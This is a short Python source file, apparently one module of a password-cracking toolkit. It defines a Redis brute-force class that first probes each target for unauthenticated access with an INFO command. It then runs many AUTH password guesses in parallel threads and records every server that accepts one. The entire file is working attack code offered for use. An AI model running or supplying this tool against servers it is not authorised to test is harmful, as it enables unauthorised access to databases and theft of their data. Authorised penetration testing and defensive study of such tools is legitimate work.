#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-09-25 21:11:15
@LastEditTime: 2019-12-13 16:38:34
'''

import socket
from concurrent.futures import ThreadPoolExecutor

class RedisBruteForce(object):
    """RedisBruteForce"""
    def __init__(self, targets, thread_num, timeout):
        super(RedisBruteForce, self).__init__()
        self.targets = targets
        self.thread_num = thread_num
        self.timeout = timeout
        self.unauth_result = list()

    def check_unauth(self,host,port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send("INFO\r\n".encode())
            result = s.recv(1024)
        except Exception as e:
            print("{} {}".format(host,e))
        else:
            if "redis_version".encode() in result:
                hook_msg((True,host,port,"Anonymous",""))
                self.unauth_result.append(host)
        finally:
            s.close()

    def worker(self,hpup):
        host,port,user,pwd = hpup
        data = "AUTH {}\r\n".format(pwd)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(data.encode())
            result = s.recv(1024)
        except Exception as e:
            hook_msg((False,host,port,user,pwd))
            # logger.error("{} {}".format(host,e))
        finally:
            if "+OK".encode() in result:
                hook_msg((True,host,port,"",pwd))

    def run(self):
        socket.setdefaulttimeout(self.timeout)

        ip_port_list = set([(x[0],x[1]) for x in self.targets])
        for ip,port in ip_port_list:
            self.check_unauth(ip,port)

        with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
            for host,port,user,pwd in self.targets:
                if host not in self.unauth_result:
                    f = executor.submit(self.worker,(host,port,user,pwd))

bruter = RedisBruteForce
